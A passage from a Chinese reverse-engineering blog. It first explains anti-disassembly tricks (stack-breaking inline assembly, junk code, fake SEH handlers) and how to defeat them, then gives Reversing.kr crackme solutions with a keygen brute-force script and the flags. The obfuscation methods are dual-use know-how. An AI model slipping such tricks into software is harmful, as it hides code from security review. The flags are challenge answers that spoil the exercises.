<p><strong>破坏栈帧</strong><br>由于 IDA 在反编译的时候维护了一个栈，在解析到诸如 PUSH POP 等对栈的大小进行操作的指令时，会模拟这些操作，我们知道，程序在运行过程中，无论调用了哪些函数，函数的栈帧一定是平衡的，即无论栈被抬升多少，在函数返回时，一定会将栈进行恢复。<br>当 IDA 检测到某一个函数的栈帧不平衡时，就会拒绝反编译这个函数(因为无法确定必要的变量和地址等)，并且报出 sp-analysis-fail(栈指针分析失败)，相信这个错误我们经常看到，通常就是汇编代码中某处操作了栈(或者 IDA 认为操作了栈)而没有恢复，导致栈帧不平衡。<br>一些情况下，这是编译器的优化问题，或者是 IDA 自身的解析问题，但是更多的情况下，这是软件的开发者制作的陷阱，比如下面的一个小程序：  </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * flag = <span class="string">&quot;flag&#123;de-decompiler_smash_stack&#125;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the flag:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, input);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(input[i] != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len != <span class="number">31</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i] != input[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SUCCESS!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译后使用 IDA 打开，直接在主函数按下 F5 ，得到的代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, v7);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v4;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">31</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( aFlagDeDecompil[i] != v7[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;SUCCESS!&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到已经非常接近源代码了(不得不说 IDA 的反编译非常强)，轻易就可以找到 flag。<br>但是如果我们在源代码里加入一小段汇编：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * flag = <span class="string">&quot;flag&#123;de-decompiler_smash_stack&#125;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the flag:\n&quot;</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;push rax\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;xor rax,rax\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;jz lable_001\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;add esp, 4\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;lable_001:\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;pop rax&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, input);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(input[i] != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len != <span class="number">31</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i] != input[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SUCCESS!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 printf 函数下方加入了一小段汇编代码，这时使用 IDA 打开程序，定位到主函数按下 F5，你会发现IDA报错：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler1.png"
                      alt="image"
                ><br>提示栈指针分析失败，那么插入的短短几行代码究竟做了什么，让 IDA 的 F5 失效了？<br>分析汇编代码不难发现，执行逻辑是先将 RAX 入栈，然后清空 RAX，注意这时 ZF 会被置为 1，然后来到一条跳转(jz)，只要 ZF 为 1 则跳转，那么接下来就会跳过 add esp 4 这条指令，将 RAX 恢复然后继续正常流程。<br>ESP (RSP)是栈顶指针寄存器，它保存了当前的栈顶地址，IDA 在解析执行流时并不知道这里的跳转(jz)是否会得到执行，于是 IDA 会先将所有指令都视为能够执行，ESP就会增加 4 ，但是在代码末尾并没有恢复 ESP 的值，导致了栈帧不平衡， IDA 拒绝反编译这个函数。<br>分析清楚了原因，那么解决办法很简单，我们将 add esp 4 这条指令 nop 掉，IDA 栈帧就不会被破坏，反编译就可以正常进行。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler2.png"
                      alt="image"
                ></p>
<p>在继续之前，我们需要明白机器码并不是必须要有严谨的格式或顺序才能被反汇编成汇编代码的，使用 IDA 打开一个程序其中的代码是有逻辑顺序可言的，但是我们也可以打开一个和程序毫不相关的文件，例如一张图片。  <br>我找到一张图片(png)，在 IDA 中打开，随意找到一处按下C键，得到了以下代码：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:000000000000004B                 out     0Ch, eax        ; DMA controller, 8237A-5.</span><br><span class="line">seg000:000000000000004B                                         ; clear byte pointer flip-flop.</span><br><span class="line">seg000:000000000000004D                 and     dh, [rax+4B0925A4h]</span><br><span class="line">seg000:0000000000000053                 push    rdx</span><br><span class="line">seg000:0000000000000054                 adc     [rsp+rdx*4-60h], eax</span><br><span class="line">seg000:0000000000000059                 or      [rdx], ch</span><br><span class="line">seg000:000000000000005B                 and     [rax], ch</span><br><span class="line">seg000:000000000000005D                 sub     ah, [rdx]</span><br><span class="line">seg000:000000000000005F                 push    rcx</span><br><span class="line">seg000:0000000000000060</span><br><span class="line">seg000:0000000000000060 loc_60:                                 ; CODE XREF: seg000:000000000000007A↓j</span><br><span class="line">seg000:0000000000000060                 db      45h</span><br><span class="line">seg000:0000000000000060                 add     cs:0FFFFFFFF8A0310A9h, r10d</span><br><span class="line">seg000:0000000000000068                 adc     dl, [rsp+rdx*2]</span><br><span class="line">seg000:000000000000006B                 add     al, 91h</span><br><span class="line">seg000:000000000000006E</span><br><span class="line">seg000:000000000000006E loc_6E:                                 ; CODE XREF: seg000:0000000000000078↓j</span><br><span class="line">seg000:000000000000006E                 mov     al, ds:5006F209505E80A2h</span><br><span class="line">seg000:0000000000000077                 out     dx, eax</span><br><span class="line">seg000:0000000000000078                 jge     short near ptr loc_6E+3</span><br><span class="line">seg000:000000000000007A                 jg      short near ptr loc_60+3</span><br><span class="line">seg000:000000000000007C                 mov     ebp, 9E9CFAF3h</span><br><span class="line">seg000:0000000000000081                 stc</span><br><span class="line">seg000:0000000000000082</span><br><span class="line">seg000:0000000000000082 loc_82:                                 ; CODE XREF: seg000:00000000000000A2↓j</span><br><span class="line">seg000:0000000000000082                 jnz     short loc_FA</span><br><span class="line">seg000:0000000000000085                 cmc</span><br><span class="line">seg000:0000000000000086                 push    rdi</span><br><span class="line">seg000:0000000000000087                 push    rbx</span><br><span class="line">seg000:0000000000000088                 fnsave  byte ptr cs:0FFFFFFFFF000BB53h</span><br><span class="line">seg000:000000000000008E                 test    al, 0F8h</span><br><span class="line">seg000:0000000000000090                 db      47h, 47h</span><br><span class="line">seg000:0000000000000090                 mov     al, ds:9939A38A8C880198h</span><br><span class="line">seg000:000000000000009C                 sbb     ecx, [rcx]</span><br><span class="line">seg000:000000000000009E                 jp      short loc_118</span><br><span class="line">seg000:00000000000000A0                 jp      short near ptr loc_A9+2</span><br><span class="line">seg000:00000000000000A2                 loop    loc_82</span><br><span class="line">seg000:00000000000000A4                 add     bl, [rax]</span><br><span class="line">seg000:00000000000000A6                 xor     [rax], ah</span><br><span class="line">seg000:00000000000000A8                 popfq</span><br><span class="line">seg000:00000000000000A9</span><br><span class="line">seg000:00000000000000A9 loc_A9:                                 ; CODE XREF: seg000:00000000000000A0↑j</span><br><span class="line">seg000:00000000000000A9                 xadd    dh, bh</span><br><span class="line">seg000:00000000000000AC                 xchg    eax, esp</span><br><span class="line">seg000:00000000000000AD                 fsubr   dword ptr [rax+43h]</span><br></pre></td></tr></table></figure></div>
<p>然而这只是一张图片，并不是一个ELF或者EXE的可执行程序，IDA居然可以识别出很多的汇编代码，是不是很惊讶？<br>事实上，一个二进制文件(图片或视频或音频等等)其中至少有 90% 可以被解析成代码，只是这些代码没有任何意义罢了，那么为什么 IDA 还是会将这些不相关的机器码识别出来？  </p>
<p>反汇编器的两种实现方式：</p>
<ol>
<li>线性扫描</li>
<li>递归下降</li>
</ol>
<p>反汇编器所面临了一个难题就是如何区分指令和数据，这在 x86 指令集(x64) 体现的尤其明显，由于指令长度是可变的(<strong>字节数不同，可能是为了前向兼容</strong>)，所以CPU解码的流程异常复杂，导致反汇编工作也非常困难。<br>关于线性扫描反汇编器，这里借用 PDF 中的解释，一个可执行文件使用十六进制查看，取其中的一小段机器码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler3.png"
                      alt="image"
                ></p>
<p>关注其中的高亮部分，指令可以分为三句</p>
<ol>
<li>call 0x401a20</li>
<li>jmp 0x401349</li>
<li>mov edi,edi</li>
</ol>
<p>如果将解析指令的起始位置向后移动两个字节，就会得到以下指令序列：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler4.png"
                      alt="image"
                ></p>
<ol>
<li>add al,0x0</li>
<li>add cl,ch</li>
<li>pop eax</li>
<li>std</li>
<li>db 0xff（error ins）</li>
<li>dec dword [ebx - 0x1374aa01]</li>
</ol>
<p>两者进行一下对比，变化非常明显，我们得到的指令完全没有意义，而造成这些后果的原因只是解析指令的开始位置向后移动了两个字节而已。</p>
<p>线性扫描类型的反汇编器会试图解析一个程序代码段的所有机器码，一条指令的开始通常是上一条指令的结尾，并且不会区分指令类型，所以，如果在这些正常的指令之间插入一些垃圾代码(比如一个字符串)，就可能会打乱线性扫描反汇编器的整个反汇编流程，导致后续代码全部错误。<br>例如：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler5.png"
                      alt="image"
                ><br>浅蓝色的部分实际上是插入的字符串，它们本不应该被解析成指令，但是线性扫描反汇编器在解析完上一条指令之后，会认为这里也是正常的指令(在代码段)，强行解析导致后续的代码都会解析失败(这一类反汇编器的代表：winDBG)。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler6.png"
                      alt="image"
                ></p>
<p>关于递归下降反汇编器，它和线性扫描型反汇编器最大的区别就是它在解析到某一条更改了控制流的指令时(如 jmp、call、ret等)，会尝试获取到跳转的目的地址，并且转向目的地址继续解析代码，而不是直接向后解析。<br>然而它也不是完美的，在某些情况下，控制流更改的目的地不是确定的，而是动态计算出来(比如 <strong>call eax</strong> 这样)，那么反汇编器也不能确定目的地址，造成的一个后果就是，程序中某些代码一直也没有被调用(或跳转到)，那么这部分代码就可能永远也不会被解析(这类反汇编器的代表是 IDA 和 OD)。</p>
<p>接下来继续分析一下反反编译的技术(一些手段在看雪的文章中已经存在详细的分析，这里拿几个稍加分析)：</p>
<p><strong>垃圾代码</strong><br>PDF 中比较简单的一个反反编译策略，也比较有意思。  <br>简单的了解了反汇编器的大致工作原理，我们就可以着手破坏它的工作流程，一个简单的方法就是在正常的代码中夹杂垃圾代码，这些垃圾代码可以是真实的指令，也可以是一些字符串，总之，它们本不应该出现在正常的代码中。<br>插入的垃圾代码的一般结构可能有以下特征：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp lable</span><br><span class="line"> db junk code</span><br><span class="line">lable:</span><br><span class="line"> normal code</span><br></pre></td></tr></table></figure></div>
<p>jmp 指令是一定会被执行的，所以内部的 junk code 不会被执行，但是它们还是会对反汇编器造成影响，例如第一种方式提到的破坏 IDA 的栈，使其不平衡。<br>但是那种方法比较简单，容易被发现，这里会采取一个更加隐秘的方法，将正常的代码插入到垃圾代码中，并更改执行流到垃圾代码。<br>观察以下代码片段：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">call $+5</span><br><span class="line">pop eax</span><br><span class="line">add eax 10h</span><br><span class="line">call eax</span><br><span class="line">inc esi</span><br><span class="line">popad </span><br><span class="line">outsb </span><br><span class="line">je Label1</span><br><span class="line">jnc Label2</span><br><span class="line">imul esp,[ebx+21h],001337D8h</span><br><span class="line">add byte ptr [eax],al</span><br><span class="line">dd 2 dup(0)</span><br><span class="line">db 0</span><br></pre></td></tr></table></figure></div>
<p>有几句代码非常诡异，不像是正常程序应该有的，而且有一条奇怪的指令： call $+5 ，其实它的意思就是调用下一条指令，那么这里发生了什么？</p>
<ol>
<li>call $+5，将 call 指令分解，就是 push 下一条指令的地址，然后 jmp 到目的地址继续运行，而这里的目的地址就是下一条指令。</li>
<li>运行到 pop eax，将之前压入栈中的地址(就是这条指令的地址)弹出给 eax。</li>
<li>add eax,10h ，将 eax 中的值加上 0x10。</li>
<li>call eax，调用经过上面处理的地址。</li>
</ol>
<p>在 IDA 中可以看到这样的代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler7.png"
                      alt="image"
                ></p>
<p>经过计算可以知道，最后的 call eax 实际会执行地址为 0x401032 ，但是目的地址附近的代码并没有在 IDA 中体现出来，其实真实的代码被夹杂在 junk code 中了，在垃圾代码上按下 U 键，然后在正确的地址按下 C 键，就能得出正常代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler8.png"
                      alt="image"
                ></p>
<p><strong>伪造SEH</strong></p>
<p>另一个比较有意思的反反编译方式在 PDF 中给出，那就是伪造一个(或者说是修改现有的)SEH，什么是 SEH?  <br>SEH 全称：结构化异常处理，是 Windows 操作系统上的一种异常处理机制，当程序发生异常时，就会用到这个东西，它是由一些结构体(EXCEPTION_REGISTRATION)串接而成的单向链表，每个结构体内都有两个主要字段:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_EXCEPTION_REGISTRATION struc</span><br><span class="line"></span><br><span class="line">prev     dd ?</span><br><span class="line"></span><br><span class="line">handler dd ?</span><br><span class="line"></span><br><span class="line">_EXCEPTION_REGISTRATION   ends</span><br></pre></td></tr></table></figure></div>

<p>prev 表示下一个结构体的地址，而 handler 就是处理异常的函数。<br>了解了什么是 SEH ，我们来看一个代码片段：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler9.png"
                      alt="image"
                ></p>
<p>乍一看没有什么异常，但是这里有一条奇怪的指令(图中红框), mov large fs:0,esp ，可以简化为 mov fs[0],esp<br>将 ESP 即当前栈顶赋值给 fs 段的第一个元素，其实这是一个比较明显的操作：安装 SEH ，这句代码的含义就是把正常的 SEH 链表的第一个结构体的地址迁移到了栈上，即在 ESP 开始的栈空间存在了一个 EXCEPTION_REGISTRATION 结构体，结合代码前面的 push 操作，就可以知道，开发者在栈上制作了一个 EXCEPTION_REGISTRATION 结构，修改了正常的 handler 的值(感觉有些像 PWN OvO)，注意在 0x40118E 这句代码，可以转化为 mov dword ptr [0], 0 ，向一个不存在的地址赋值，一定会触发异常，从而调用到了开发者自己制作的 SEH。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler10.png"
                      alt="image"
                ></p>
<p>通过计算出这个异常处理函数的地址，我们就能找到真正正确的代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler11.png"
                      alt="image"
                ></p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>看了看雪的这篇文章，简单进行小总结，了解到几种很经典的反反编译方法，其中有几个非常巧妙，包括隐藏真实代码到垃圾代码，修改返回地址，注册假的 SEH 等等，反反编译还有更多的方法，虽然手法多种多样，但是最重要的是欺骗反编译器，隐藏程序的实际流程，不过再强的花指令也是可以被清除的，所以通常可以配合软件加壳，代码混淆等技术，增大逆向难度。</p>
<p>识别花指令的办法：当看到某些指令是不常见的，或者一些指令序列毫无逻辑可言，那么就要小心了，因为这里可能就是一段花指令，如果没有明显的花指令出现，那么就要关注特殊的指令序列，包括自行注册 SEH ，修改程序的返回地址等等，其实花指令做到的只是反静态分析，对于经验老到的逆向工作者来说，动态调试通常是破解这些花指令的好办法。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Reversing.kr 6-9</title>
    <url>/2018/09/08/reversingkr6-9/</url>
    <content><![CDATA[<p>Reversing.kr 上面的题目。</p>
<span id="more"></span>

<h2 id="06-ImagePrc"><a href="#06-ImagePrc" class="headerlink" title="06 ImagePrc"></a>06 ImagePrc</h2><p>打开程序，里面有一个 check 按钮，但是没有文本框等常规元素，直接点击按钮会弹窗报错，在偶然的操作中发现，可以按住鼠标左键在窗口中画画：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-1.png"
                      alt="image"
                ></p>
<p>打开IDA加载文件，可以直接将 WinMain 函数反编译，会看到很多的系统函数，在第 16 行可以看到另外一个函数，双击进入，发现有更多的系统函数，依次上网查阅会发现，它们大多数与绘图有关，以程序的窗口为画布去绘制一些图形，在函数的下方可以找到一处判断：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-3.png"
                      alt="image"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-2.png"
                      alt="image"
                ></p>
<p>大致观察发现，上方调用了几个 API 加载了一张图片，然后进入一个 while 循环，不难猜测，这个 while 循环能够继续进行的条件应该就是两张图片(我们绘制的和程序加载的)的像素完全吻合，其中变量 v12 所记录的应该就是匹配的像素数量，如果大于 90000 个，则不会报错。<br>由于我们是使用鼠标绘制，由于鼠标不可精确控制，所以通过正常渠道得到 flag 应该是不可能的，需要直接抽取 EXE 中的图片资源，这里用到一个工具 eXescope ，将程序在 eXescope 中打开：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-4.png"
                      alt="image"
                ></p>
<p>在资源类下能够发现名为 101 的资源，大致浏览一下这个文件，只有 0xff 和 0x00 这两种字节，而且它的大小为 0x15F90 即 90000 个字节，和程序中对比的像素数一致，猜测这个文件就是图片文件，将它导出，由于图片只有黑白两种颜色，所以应该是 3 个字节一组，构成 (R,G,B) 的形式，而且图像的高度和宽度也是可以找到的：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-5.png"
                      alt="image"
                ></p>
<p>为了方便，直接使用 python 的 PIL 库处理这个文件，编写以下脚本：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">width = 200</span><br><span class="line">height = 150</span><br><span class="line"></span><br><span class="line">fp = open(&#x27;101&#x27;, &#x27;rb&#x27;)</span><br><span class="line">data = fp.read()</span><br><span class="line">im = Image.frombytes(&#x27;RGB&#x27;, (width, height), data)</span><br><span class="line">im = im.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">im.show()</span><br><span class="line">im.save(&#x27;flag.bmp&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>得到图像如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-6.png"
                      alt="image"
                ></p>
<p>flag： <strong>GOT</strong></p>
<h2 id="07-Position"><a href="#07-Position" class="headerlink" title="07 Position"></a>07 Position</h2><p>编写注册机的题目，阅读说明，要求我们找到序列号为 “76876-77776” 的用户名，并且提示可能存在多解，只需要找到最后一位是 p 的用户名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-1.png"
                      alt="image"
                ></p>
<p>MFC 的程序一般比较混乱，用 IDA 打开可见一斑，搜索字符串可以找到关键函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-2.png"
                      alt="image"
                ></p>
<p>进入 <strong>check</strong> 函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-3.png"
                      alt="image"
                ></p>
<p>系统所提供的函数都非常难看，但是除此之外逻辑比较清晰，通过查找各个 API 的用途可以整理出程序逻辑，其中关键算法在这里：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-4.png"
                      alt="image"
                ></p>
<p>相同的算法有两处，每次都取输入的用户名中的 2 位，故可以知道用户名的长度为 4 个字节，而且计算过程也是比较简单的，将取得的两个字节分别计算出 5 个新的数字，然后带入比较，按一定顺序组合计算得到的 10 个数字，然后和输入的注册码进行比较，第二处代码也是如此，那么我们编写注册机时，可以直接将这里的伪代码搬下来，稍加修改即可，但是题目要求找到注册码对应的用户名，直接爆破：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python 2.7</span><br><span class="line">#name = raw_input(&quot;Please input a name:&quot;)</span><br><span class="line">name = []</span><br><span class="line">for a in range(97,123):</span><br><span class="line">    for b in range(97,123):</span><br><span class="line">        for c in range(97,123):</span><br><span class="line">            for d in range(97,123):</span><br><span class="line">                name.append(a)</span><br><span class="line">                name.append(b)</span><br><span class="line">                name.append(c)</span><br><span class="line">                name.append(d)</span><br><span class="line">                serial = &quot;&quot;</span><br><span class="line">                if len(name) != 4:</span><br><span class="line">                    print(&quot;Wrong length!!&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    v6 = name[0]</span><br><span class="line">                    v8 = name[1]</span><br><span class="line">                    v7 = (v6 &amp; 1) + 5</span><br><span class="line">                    v48 = ((v6 &gt;&gt; 4) &amp; 1) + 5</span><br><span class="line">                    v42 = ((v6 &gt;&gt; 1) &amp; 1) + 5</span><br><span class="line">                    v44 = ((v6 &gt;&gt; 2) &amp; 1) + 5</span><br><span class="line">                    v46 = ((v6 &gt;&gt; 3) &amp; 1) + 5</span><br><span class="line">                    v34 = (v8 &amp; 1) + 1;</span><br><span class="line">                    v40 = ((v8 &gt;&gt; 4) &amp; 1) + 1</span><br><span class="line">                    v36 = ((v8 &gt;&gt; 1) &amp; 1) + 1</span><br><span class="line">                    v9 = ((v8 &gt;&gt; 2) &amp; 1) + 1</span><br><span class="line">                    v38 = ((v8 &gt;&gt; 3) &amp; 1) + 1</span><br><span class="line">                    serial += str(v7 + v9)</span><br><span class="line">                    serial += str(v46 + v38)</span><br><span class="line">                    serial += str(v42 + v40)</span><br><span class="line">                    serial += str(v44 + v34)</span><br><span class="line">                    serial += str(v48 + v36)</span><br><span class="line">                    serial += &#x27;-&#x27;</span><br><span class="line">                    v20 = name[2]</span><br><span class="line">                    v22 = name[3]</span><br><span class="line">                    v21 = (v20 &amp; 1) + 5</span><br><span class="line">                    v49 = ((v20 &gt;&gt; 4) &amp; 1) + 5</span><br><span class="line">                    v43 = ((v20 &gt;&gt; 1) &amp; 1) + 5</span><br><span class="line">                    v45 = ((v20 &gt;&gt; 2) &amp; 1) + 5</span><br><span class="line">                    v47 = ((v20 &gt;&gt; 3) &amp; 1) + 5</span><br><span class="line">                    v35 = (v22 &amp; 1) + 1</span><br><span class="line">                    v41 = ((v22 &gt;&gt; 4) &amp; 1) + 1</span><br><span class="line">                    v37 = ((v22 &gt;&gt; 1) &amp; 1) + 1</span><br><span class="line">                    v23 = ((v22 &gt;&gt; 2) &amp; 1) + 1</span><br><span class="line">                    v39 = ((v22 &gt;&gt; 3) &amp; 1) + 1</span><br><span class="line">                    serial += str(v21 + v23)</span><br><span class="line">                    serial += str(v47 + v39)</span><br><span class="line">                    serial += str(v43 + v41)</span><br><span class="line">                    serial += str(v45 + v35)</span><br><span class="line">                    serial += str(v49 + v37)</span><br><span class="line">                    print(serial)</span><br><span class="line">                    if serial == &quot;76876-77776&quot; and name[3] == 112:</span><br><span class="line">                        for a in name:</span><br><span class="line">                            print(chr(a),)</span><br><span class="line">                        exit(0)</span><br><span class="line">                    else:</span><br><span class="line">                        name = []</span><br></pre></td></tr></table></figure></div>
<p>运行几分钟就能得到答案：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-5.png"
                      alt="image"
                ></p>
<p>flag： <strong>bump</strong></p>
<h2 id="08-Direct3D-FPS"><a href="#08-Direct3D-FPS" class="headerlink" title="08 Direct3D FPS"></a>08 Direct3D FPS</h2><p>本题很有意思，打开发现是一个 FPS 游戏(我运行这个游戏帧数非常低，可能只有个位数，应该是显卡兼容性问题)，猜测应该是清完所有怪物就能拿到 flag ，勉强打了一会，实在是无法正常游戏，转而进行静态分析，使用 IDA 打开程序后，反编译 WinMain 函数，可以发现很多和游戏相关的操作，例如加载音频，图像等等，在第 135 行发现对 HP 进行了判断，紧接着一个函数内有 游戏通关 的提示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-6.png"
                      alt="image"
                ></p>
